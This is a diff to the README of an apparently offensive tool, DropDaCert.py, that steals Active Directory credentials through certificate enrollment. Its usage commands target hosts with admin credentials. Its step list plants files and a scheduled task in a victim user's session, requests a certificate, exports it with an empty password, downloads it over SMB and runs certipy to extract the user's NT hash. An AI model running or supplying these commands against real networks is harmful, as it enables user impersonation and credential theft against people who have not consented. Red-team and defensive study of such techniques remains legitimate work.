@@ -86,9 +86,9 @@ python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-meth
 # Manual mode — generate files and print instructions only
 python3 DropDaCert.py admin@target -ca 'CA01\CA' -dc 10.0.0.1 --exec-method manual -tu jsmith
 
-# Non-admin target (C:\Users\Public + cmd wrapper)
+# Non-admin target (C:\Users\Public)
 python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv \
-  --drop-dir 'C:\Users\Public' --exec-wrapper cmd
+  --drop-dir 'C:\Users\Public'
 ```
 
 ### Options
@@ -114,7 +114,7 @@ python3 DropDaCert.py admin:'Pass'@target -ca 'CA01\CA' -dc 10.0.0.1 -tu lowpriv
 1. Connects via WinRM (default) or SMB (psexecsvc)
 2. Enumerates active sessions and resolves domain via WMI
 3. Uploads `cert.inf`, `cert.bat`, `cert.xml` via SMB
-4. Creates scheduled task with `InteractiveToken` — runs in the target user's live session
+4. Creates scheduled task — runs in the target user's session context
 5. `cert.bat` runs `certreq` to enroll, exports PFX with empty password
 6. Polls for PFX via SMB, downloads it
 7. Runs `certipy auth` to extract NT hash
